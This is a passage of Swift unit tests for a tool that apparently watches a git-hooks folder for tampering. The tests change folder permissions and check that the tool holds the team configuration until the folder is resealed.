        try #require(chmod(copy, 0o700) == 0 && chmod(hooks, 0o700) == 0)
        let (root, lead) = try team()
        try #require(chmod(copy, 0) == 0)
        defer { chmod(copy, 0o700) }
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "the copy unreadable")
        // Its mode put back: as sealed, and the app's look clears the hold. The watched folder itself, too.
        chmod(copy, 0o700)
        _ = try vault.checkConfig(root: root)
        #expect(try lead.checkConfig(root: root).held.isEmpty, "put back")
        try #require(chmod(hooks, 0) == 0)
        defer { chmod(hooks, 0o700) }
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "the folder unreadable")
    }

    /// A folder's mode changed in place, under a watched folder or of the folder itself, is a change.
    @Test(LinuxSealListTests.linux) func aFoldersModeChangeHoldsTheTeam() throws {
        let hooks = home + "/.vibeswitcher/lead/git-hooks"
        try LinuxSealListTests.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
        try #require(chmod(hooks + "/0123456789abcdef/copy/hooks", 0o700) == 0 && chmod(hooks, 0o700) == 0)
        let (root, lead) = try team()
        try #require(chmod(hooks + "/0123456789abcdef/copy/hooks", 0o777) == 0)
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "a subfolder's mode")
        #expect(try vault.checkConfig(root: root).resealed == ["~/.vibeswitcher/lead/git-hooks"])
        try #require(chmod(hooks, 0o777) == 0)
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "the folder's own mode")
    }
}
